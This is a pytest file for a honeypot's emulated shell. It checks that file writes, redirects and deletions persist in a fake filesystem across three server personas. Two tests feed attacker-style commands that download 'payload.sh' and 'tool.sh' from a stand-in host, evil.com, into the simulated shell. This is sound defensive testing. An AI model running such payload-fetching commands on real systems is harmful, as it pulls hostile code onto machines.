"""Test that write commands persist through the overlay and are visible to reads.

Exercises the full 12-step sequence through create_dispatcher() for every
persona, verifying mkdir/cd/touch/echo>/cat/rm all interact correctly.
"""
from __future__ import annotations

import asyncio

import pytest

from honeypot.cowrie_hook import create_dispatcher

PERSONA_NAMES = ["generic_linux", "dev_workstation", "finance_server"]


def _run(coro):
    return asyncio.get_event_loop().run_until_complete(coro)


def _dispatch(disp, cmd: str) -> str:
    """Dispatch a command and return its output text."""
    resp, _source = disp.dispatch(cmd)
    return resp


@pytest.fixture(params=PERSONA_NAMES)
def disp(request):
    return create_dispatcher(persona_name=request.param, login_user="root")


class TestWriteCommandsPersist:
    """12-step sequence proving overlay writes are visible to reads."""

    def test_full_sequence(self, disp):
        # Step 1: pwd — record home directory
        home = _dispatch(disp, "pwd")
        assert home.startswith("/"), f"pwd returned unexpected: {home!r}"
        print(f"Step 1  pwd           -> {home!r}")

        # Step 2: mkdir testdir — silent success
        out = _dispatch(disp, "mkdir testdir")
        assert out == "", f"mkdir should be silent, got: {out!r}"
        print(f"Step 2  mkdir testdir -> {out!r}")

        # Step 3: ls — testdir must appear
        out = _dispatch(disp, "ls")
        assert "testdir" in out, f"testdir missing from ls: {out!r}"
        print(f"Step 3  ls            -> {out!r}")

        # Step 4: cd testdir — must succeed
        out = _dispatch(disp, "cd testdir")
        assert out == "", f"cd testdir failed: {out!r}"
        print(f"Step 4  cd testdir    -> {out!r}")

        # Step 5: pwd — must end with /testdir
        out = _dispatch(disp, "pwd")
        assert out.endswith("/testdir"), f"pwd after cd: {out!r}"
        print(f"Step 5  pwd           -> {out!r}")

        # Step 6: touch secret.txt — silent success
        out = _dispatch(disp, "touch secret.txt")
        assert out == "", f"touch should be silent, got: {out!r}"
        print(f"Step 6  touch secret  -> {out!r}")

        # Step 7: ls — secret.txt must appear
        out = _dispatch(disp, "ls")
        assert "secret.txt" in out, f"secret.txt missing from ls: {out!r}"
        print(f"Step 7  ls            -> {out!r}")

        # Step 8: echo "hello" > secret.txt — must work (redirect)
        out = _dispatch(disp, 'echo "hello" > secret.txt')
        assert out == "", f"echo redirect should be silent, got: {out!r}"
        print(f"Step 8  echo > file   -> {out!r}")

        # Step 9: cat secret.txt — must return exactly "hello"
        out = _dispatch(disp, "cat secret.txt")
        assert out.strip('"') == "hello" or out == "hello", (
            f"cat should return hello, got: {out!r}"
        )
        print(f"Step 9  cat secret    -> {out!r}")

        # Step 10: cd .. — back to original directory
        out = _dispatch(disp, "cd ..")
        assert out == "", f"cd .. failed: {out!r}"
        cwd = _dispatch(disp, "pwd")
        assert cwd == home, f"Should be back at {home}, got: {cwd!r}"
        print(f"Step 10 cd ..         -> pwd={cwd!r}")

        # Step 11: rm -rf testdir — silent success
        out = _dispatch(disp, "rm -rf testdir")
        assert out == "", f"rm -rf should be silent, got: {out!r}"
        print(f"Step 11 rm -rf        -> {out!r}")

        # Step 12: ls — testdir must NOT appear
        out = _dispatch(disp, "ls")
        assert "testdir" not in out, f"testdir still in ls after rm: {out!r}"
        print(f"Step 12 ls            -> {out!r}")


class TestWgetThenLs:
    """Verify wget creates a file visible in ls and readable by cat."""

    def test_wget_creates_file(self, disp):
        _dispatch(disp, "cd /tmp")
        out = _dispatch(disp, "wget http://evil.com/payload.sh")
        assert "saved" in out.lower()

        ls_out = _dispatch(disp, "ls")
        assert "payload.sh" in ls_out

        cat_out = _dispatch(disp, "cat payload.sh")
        assert len(cat_out) > 0


class TestCurlThenLs:
    """Verify curl -o creates a file visible in ls and readable by cat."""

    def test_curl_o_creates_file(self, disp):
        _dispatch(disp, "cd /tmp")
        out = _dispatch(disp, "curl -o tool.sh http://evil.com/tool.sh")
        assert "100" in out

        ls_out = _dispatch(disp, "ls")
        assert "tool.sh" in ls_out

        cat_out = _dispatch(disp, "cat tool.sh")
        assert len(cat_out) > 0


class TestEchoAppendRedirect:
    """Verify >> appends content."""

    def test_append_redirect(self, disp):
        _dispatch(disp, "touch /tmp/log.txt")
        _dispatch(disp, 'echo "line1" >> /tmp/log.txt')
        _dispatch(disp, 'echo "line2" >> /tmp/log.txt')
        out = _dispatch(disp, "cat /tmp/log.txt")
        assert "line1" in out
        assert "line2" in out
